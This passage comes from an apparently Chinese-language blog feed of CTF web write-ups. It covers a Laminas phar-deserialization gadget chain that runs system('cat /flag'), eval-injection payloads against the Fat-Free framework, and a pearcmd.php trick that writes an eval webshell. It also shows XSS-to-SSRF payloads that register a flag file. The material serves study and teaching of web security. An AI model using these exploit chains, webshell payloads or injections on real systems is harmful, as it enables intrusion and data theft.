                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"image-file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"The picture size must be more than 3kb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token function">realpath</span><span class="token punctuation">(</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'/public/img/'</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"image-file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$base</span><span class="token punctuation">;</span>
                <span class="token keyword">echo</span> <span class="token variable">$img_path</span><span class="token punctuation">;</span>
                <span class="token variable">$form</span><span class="token operator">-&gt;</span><span class="token function">saveImg</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"image-file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
                <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Only Img Can Be Uploaded!'</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token comment">// Form is valid, save the form!</span>
            <span class="token comment">//return $this-&gt;redirect()-&gt;toRoute('upload-form/success');</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'form'</span> <span class="token operator">=&gt;</span> <span class="token variable">$form</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>白名单限制只能<code>.jpg .jpeg .png</code>三种后缀，有一个正则过滤phar文件<code>"/&lt;\?|php|HALT\_COMPILER/i"</code></p>
<p>找利用点，在imgdeleteAction()有<code>@unlink($imgpath);</code>，可以触发phar反序列化，原理是<code>unlink()</code>函数在通过<code>phar://</code>伪协议解析phar文件时，会将meta-data进行反序列化</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">imgdeleteAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">getPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'imgpath'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$imgpath</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">getPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'imgpath'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$base</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$imgpath</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">white_list</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token comment">//白名单</span>
            @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$imgpath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Only Img File Can Be Deleted!'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>构造如下exploit，本地php环境运行即会自动在当前目录生成phar.phar文件（笔者此处用的是phpstudy集成环境）</p>
<p>注意：要将php.ini中phar.readonly选项设置为Off，否则无法生成phar文件</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">Laminas<span class="token punctuation">\</span>View<span class="token punctuation">\</span>Resolver</span><span class="token punctuation">{</span>
	<span class="token keyword">class</span> <span class="token class-name-definition class-name">TemplateMapResolver</span><span class="token punctuation">{</span>
		<span class="token keyword">protected</span> <span class="token variable">$map</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"setBody"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">namespace</span> <span class="token package">Laminas<span class="token punctuation">\</span>View<span class="token punctuation">\</span>Renderer</span><span class="token punctuation">{</span>
	<span class="token keyword">class</span> <span class="token class-name-definition class-name">PhpRenderer</span><span class="token punctuation">{</span>
		<span class="token keyword">private</span> <span class="token variable">$__helpers</span><span class="token punctuation">;</span>
		<span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">__helpers</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Laminas<span class="token punctuation">\</span>View<span class="token punctuation">\</span>Resolver<span class="token punctuation">\</span>TemplateMapResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">namespace</span> <span class="token package">Laminas<span class="token punctuation">\</span>Log<span class="token punctuation">\</span>Writer</span><span class="token punctuation">{</span>
	<span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">AbstractWriter</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
	
	<span class="token keyword">class</span> <span class="token class-name-definition class-name">Mail</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractWriter</span><span class="token punctuation">{</span>
		<span class="token keyword">protected</span> <span class="token variable">$eventsToMail</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"cat /flag"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token keyword">protected</span> <span class="token variable">$subjectPrependText</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
		<span class="token keyword">protected</span> <span class="token variable">$mail</span><span class="token punctuation">;</span>
		<span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">mail</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Laminas<span class="token punctuation">\</span>View<span class="token punctuation">\</span>Renderer<span class="token punctuation">\</span>PhpRenderer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">namespace</span> <span class="token package">Laminas<span class="token punctuation">\</span>Log</span><span class="token punctuation">{</span>
	<span class="token keyword">class</span> <span class="token class-name-definition class-name">Logger</span><span class="token punctuation">{</span>
		<span class="token keyword">protected</span> <span class="token variable">$writers</span><span class="token punctuation">;</span>
		<span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">writers</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Laminas<span class="token punctuation">\</span>Log<span class="token punctuation">\</span>Writer<span class="token punctuation">\</span>Mail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">namespace</span><span class="token punctuation">{</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Laminas<span class="token punctuation">\</span>Log<span class="token punctuation">\</span>Logger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>用xxd查看生成的phar文件16进制编码，在ASCII码侧可看到meta-data部分序列化的数据</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230814145559560.png"></p>
<p>由于会对phar文件的静态特征进行正则过滤，所以可以先gzip压缩，再修改后缀为.png，以此绕过正则过滤</p>
<p>参考：<a href="https://www.freebuf.com/articles/web/291992.html">https://www.freebuf.com/articles/web/291992.html</a></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230814112745664.png"></p>
<p>imguploadAction()要求上传文件大小必须大于3kb，那么我们可以用16进制编辑器再将文件填充到大于3kb</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"image-file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"The picture size must be more than 3kb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230814112815816.png" style="zoom:80%;">

<p>在<code>/album/imgupload</code>上传修改好的png文件，返回图片的路径</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230814131104277.png"></p>
<p>然后在<code>/album/imgdelete</code>用phar伪协议访问图片地址，从而用<code>unlink()</code>函数触发phar反序列化</p>
<pre class="line-numbers language-none"><code class="language-none">phar:///var/www/public/img/a9a9ccc55eab0928c1f05e1647a12575.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230814131253469.png"></p>
<p>点击提交，则成功获取flag</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230814131326602.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/m0_51078229/article/details/123660344">https://blog.csdn.net/m0_51078229/article/details/123660344</a></p>
<p><a href="https://www.freebuf.com/articles/web/291992.html">https://www.freebuf.com/articles/web/291992.html</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
        <tag>php代码审计</tag>
        <tag>phar反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>HFCTF2021Quals-Unsetme</title>
    <url>/posts/d89784ec.html</url>
    <content><![CDATA[<h1 id="HFCTF2021Quals-Unsetme"><a href="#HFCTF2021Quals-Unsetme" class="headerlink" title="HFCTF2021Quals-Unsetme"></a>HFCTF2021Quals-Unsetme</h1><p>知识点概要：命令执行</p>
<p>首页</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230816144351618.png"></p>
<p>源码逻辑分析：</p>
<ol>
<li>引入base.php启动框架,并将框架实例赋值给$f3。</li>
<li>设置框架的DEBUG模式为启用。</li>
<li>检查PCRE(Perl兼容正则表达式)的版本是否低于8.0,如果低于则抛出错误。</li>
<li>使用highlight_file()函数高亮显示当前文件内容。</li>
<li>获取GET参数a的值,赋值给<code>$a</code>。</li>
<li>使用unset()删除框架实例<code>$f3</code>上的属性<code>$a</code>。</li>
<li>运行框架。</li>
</ol>
<p>下面还有三处报错，涉及两个文件：index.php和base.php，应该是一条控制流</p>
<p>FatFree框架：<a href="https://github.com/bcosca/fatfree">https://github.com/bcosca/fatfree</a></p>
<h2 id="本地调试"><a href="#本地调试" class="headerlink" title="本地调试"></a>本地调试</h2><p>1.下载官方源码（笔者调试版本是fatfree-3.7.3）</p>
<p>2.在源码根目录（即index.php同级目录），新建一个test.php，把题目源码复制进去</p>
<p>3.开启调试环境，浏览器访问test.php</p>
<p>因为可控参数为GET参数<code>a</code>，所以调试的时候重点关注此参数的流向</p>
<p>（1）什么参数都不传递的情况下</p>
<p>控制流会从test.php的12行unset()函数进入base.php的<code>__unset()</code>魔术方法</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821091243177.png"></p>
<p>然后进入offsetunset()方法</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821091326401.png"></p>
<p>进入<code>clear()</code>后，会一路执行到530行</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821091436508.png"></p>
<p>执行<code>eval('unset('.$val.');');</code>时，跳转到2337行，执行完2338行，web端返回如题目首页的错误</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821091533770.png"></p>
<p>（2）GET传参<code>?a=1</code>时，前面的控制流路线和无参时是一样的，只不过执行<code>eval('unset('.$val.');');</code>时，会跳转到如下位置</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821094501336.png"></p>
<p>从上述分析可见，eval()函数是危险函数，又因为变量<code>$val</code>是<code>@hive</code>拼接<code>$key</code>经过compile()方法处理得到，<code>$key</code>是从GET参数<code>a</code>一路传递过来的，可控，所以就有了执行命令的机会。关键在于compile()做了什么处理，跟踪关键代码如下</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821103605359.png"></p>
<p>这段代码功能相当于把<code>@hive string $a</code>替换成<code>$hive['string']</code>，又由于<code>$val</code>变量赋值的最外层正则会将<code>$hive</code>替换为<code>$this-&gt;hive</code>，所以相当于传进GET参数<code>a=string</code>，得到<code>$var</code>=<code>$this-&gt;hive['string']</code></p>
<p>可以在eval()之前添加echo调试一下：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token operator">.</span><span class="token variable">$val</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'unset('</span><span class="token operator">.</span><span class="token variable">$val</span><span class="token operator">.</span><span class="token string single-quoted-string">');'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>传参<code>?a=test</code>，结果如下</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821111417189.png"></p>
<p>传参<code>?a=test%0a);phpinfo(</code>，结果如下</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821112146364.png"></p>
<p>所以，读flag可用如下payload</p>
<pre class="line-numbers language-none"><code class="language-none">?a=test%0a);echo file_get_contents(%27/flag%27
?a=test%0a);readfile(%27/flag%27
?a=test%0a);system(%27cat%20/flag%27<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821112415657.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.plasf.cn/articles/hfctfunsetme.html">https://www.plasf.cn/articles/hfctfunsetme.html</a></p>
<p><a href="https://blog.csdn.net/Little_jcak/article/details/123516439">https://blog.csdn.net/Little_jcak/article/details/123516439</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
        <tag>php代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>HXBCTF2021-easywill</title>
    <url>/posts/291555d9.html</url>
    <content><![CDATA[<h1 id="HXBCTF2021-easywill"><a href="#HXBCTF2021-easywill" class="headerlink" title="HXBCTF2021-easywill"></a>HXBCTF2021-easywill</h1><p>知识点概要：变量覆盖、文件包含、利用pearcmd.php写shell（不出网）</p>
<p>首页</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230823145959223.png"></p>
<p>官网没有对应版本，遂找作者要了一份</p>
<p>感谢框架作者<a href="https://gitee.com/willphp/yiyu">无念</a>和他的热情帮助</p>
<h2 id="本地调试"><a href="#本地调试" class="headerlink" title="本地调试"></a>本地调试</h2><p>把<code>app/controller/IndexController.php</code>修改为题目的代码，有两个GET参数，那么我们就如下传参调试</p>
<pre class="line-numbers language-none"><code class="language-none">?name=testname&amp;value=testvalue<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>从第6行传参进入</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230823152737875.png"></p>
<p>跳转到<code>willphp/helper.php</code>206行</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230823152901910.png"></p>
<p>然后来到<code>willphp/wiphp/View.php</code>14行，可看到执行完毕后，<code>_vars</code>数组里存储了一个键值对，键和值分别对应GET请求传入的name参数值和value参数值</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230823153652373.png"></p>
<p>然后返回<code>IndexController.php</code>执行第7行</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230823154115716.png"></p>
<p>进入view()函数，来到<code>willphp/helper.php</code>215行</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230823154305064.png"></p>
<p>进入<code>fetch</code>方法，来到<code>willphp/wiphp/View.php</code>，16-38行相当于把待渲染的文件路径拼接处理出来</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230823154808961.png"></p>
<p>进入39行<code>render</code>方法，来到<code>willphp/wiphp/Tple.php</code>的14-16行</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230823155513189.png"></p>
<p>进入renderTo方法，关键在于44-45行，可利用变量覆盖实现文件包含</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230823160332654.png"></p>
<p>GET传入如下参数时，执行<code>extract($_vars);</code>后，<code>cfilevalue</code>会覆盖掉<code>$cfile</code>原来的值，如下图</p>
<pre class="line-numbers language-none"><code class="language-none">?name=cfile&amp;value=cfilevalue<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230823161628848.png"></p>
<p>比如在题目中传入<code>?name=cfile&amp;value=/etc/passwd</code>，就会返回如下内容</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230823162301045.png"></p>
<p>那么就可以通过包含pearcmd.php实现getshell</p>
<p>参考：<a href="https://blog.csdn.net/rfrder/article/details/121042290">https://blog.csdn.net/rfrder/article/details/121042290</a></p>
<p>由于环境不出网，Payload：</p>
<pre class="line-numbers language-none"><code class="language-none">?name=cfile&amp;value=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/wa0er.php+-d+man_dir=&lt;?eval($_REQUEST[0]);?&gt;+-s+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>需Burp传参，否则尖括号会被URL编码写入文件，导致无法解析成php脚本执行</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230823163548425.png"></p>
<p>然后POST传参读取flag</p>
<pre class="line-numbers language-none"><code class="language-none">?name=cfile&amp;value=/tmp/wa0er.php
0=system('cat /fl*');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230823164154298.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/weixin_46081055/article/details/124046525">https://blog.csdn.net/weixin_46081055/article/details/124046525</a></p>
<p><a href="https://blog.csdn.net/weixin_43610673/article/details/121369384">https://blog.csdn.net/weixin_43610673/article/details/121369384</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>php代码审计</tag>
        <tag>变量覆盖</tag>
        <tag>文件包含</tag>
        <tag>利用pearcmd.php写shell（不出网）</tag>
      </tags>
  </entry>
  <entry>
    <title>2021祥云杯-secrets_of_admin</title>
    <url>/posts/27ec25c5.html</url>
    <content><![CDATA[<h1 id="2021祥云杯-secrets-of-admin"><a href="#2021祥云杯-secrets-of-admin" class="headerlink" title="2021祥云杯-secrets_of_admin"></a>2021祥云杯-secrets_of_admin</h1><p>知识点概要：审计、XSS+SSRF组合拳</p>
<p>首页</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230824112447031.png" style="zoom: 67%;">

<p>有源码，源码结构：</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230824112254599.png"></p>
<p>在<code>database.ts</code>文件里有admin账户密码，可以直接登录。另外可以看出有users和files两个表，还有一个superuser用户</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230824113106579.png"></p>
<p>登录之后进入<code>/admin</code>目录，在文本框随便输入，会提示，大致意思是保存成了pdf文件，但是需要知道怎么下载</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230824113335550.png" style="zoom:67%;">

<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>审计<code>index.ts</code>，几个关键路由</p>
<p>根目录，做登录验证，登录成功设置cookie，并重定向到<code>/admin</code>目录</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230824130000441.png"></p>
<p><code>/admin</code>目录</p>
<p>1.POST提交content参数值，会有几个类似XSS的黑名单过滤；</p>
<p>2.将content直接拼接到一段HTML代码标签里；</p>
<p>3.将HTML代码写入pdf文件，pdf以uuid()的值命名，存在<code>./files/</code>路径下；</p>
<p>4.用文件名计算checksum值，将superuser、文件名、checksum值一块存入数据库。</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230824130237861.png"></p>
<p><code>/api/files</code>目录</p>
<p>1.正则匹配请求地址的socket（IP:PORT），要求冒号前（即IP地址）只能是127.0.0.1；</p>
<p>2.GET参数：username、filename、checksum只能是字符串类型，会被存储到数据库</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230824130633060.png"></p>
<p><code>/api/files/:id</code>目录</p>
<p>1.token的username不能是superuser；</p>
<p>2.token的username和请求参数id会被用来查找数据库文件名；</p>
<p>3.全场唯一读文件函数readFile读取<code>../files/</code>路径下的对应文件。</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230824130333259.png"></p>
<p>数据库getFile()操作代码如下，可以看到传入的参数id对应checksum，从files表中查找对应的文件名</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230824142748876.png"></p>
<p>捋一下思路</p>
<p>1.读文件需要token的username是admin，并且知道文件对应的checksum值；</p>
<p>2.要保证token的username是admin，只需正常登录admin账户就可以；</p>
<p>3.文件对应的checksum值则有两条路线，一条是<code>/admin</code>路由的<code>uuid()</code>生成的文件名计算所得，这不可控，另一条是通过<code>/api/files</code>路由的GET参数传入。并且从最初的database.ts可以看到，flag文件属于superuser用户，所以这里也需要通过<code>/api/files</code>路由传入一条<code>username=admin&amp;filename=flag</code>的数据，那么checksum就可以随意设置；</p>
<p>4.又因为<code>/api/files</code>路由只能通过127.0.0.1访问，所以必须通过<code>/admin</code>路由的XSS来构造SSRF请求；</p>
<p>5.<code>/admin</code>路由的XSS过滤只是对content参数过滤，所以只需以content数组的形式传入即可绕过。</p>
<p>综上，目标：以admin登录，<code>/admin</code>路由POST传入payload，<code>/api/files/:id</code>访问</p>
<p>Payload如下</p>
<pre class="line-numbers language-none"><code class="language-none">content[]=&lt;img+src%3D"http%3A//127.0.0.1:8888/api/files?username%3Dadmin%26filename%3D./flag%26checksum%3D999"&gt;
或
content[]=%3Cscript%3E%0Avar%20xhr%20%3D%20new%20XMLHttpRequest()%3Bxhr.open(%22GET%22%2C%20%22http%3A%2F%2F127.0.0.1%3A8888%2Fapi%2Ffiles%3Fusername%3Dadmin%26filename%3D.%2Fflag%26checksum%3D999%22%2C%20true)%3Bxhr.send()%3B%0A%3C%2Fscript%3E<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230824155431623.png"></p>
<p>再访问<code>/api/files/999</code>，就会把文件下载下来，打开即可看到flag</p>
<p>注：这里端口用8888是因为<code>app.ts</code>文件中设置路由监听端口是8888</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230824154058766.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://err0r.top/article/2021xyb/">https://err0r.top/article/2021xyb/</a></p>
<p><a href="https://blog.csdn.net/cjdgg/article/details/120238587">https://blog.csdn.net/cjdgg/article/details/120238587</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>XSS+SSRF组合拳</tag>
        <tag>TypeScript代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>2021祥云杯-PackageManager</title>
    <url>/posts/f7c9127f.html</url>
    <content><![CDATA[<h1 id="2021祥云杯-PackageManager"><a href="#2021祥云杯-PackageManager" class="headerlink" title="2021祥云杯-PackageManager"></a>2021祥云杯-PackageManager</h1><p>知识点概要：MongoDB盲注、TypeScript代码审计</p>
<p>首页</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821170513751.png"></p>
<p>题目源码结构：</p>
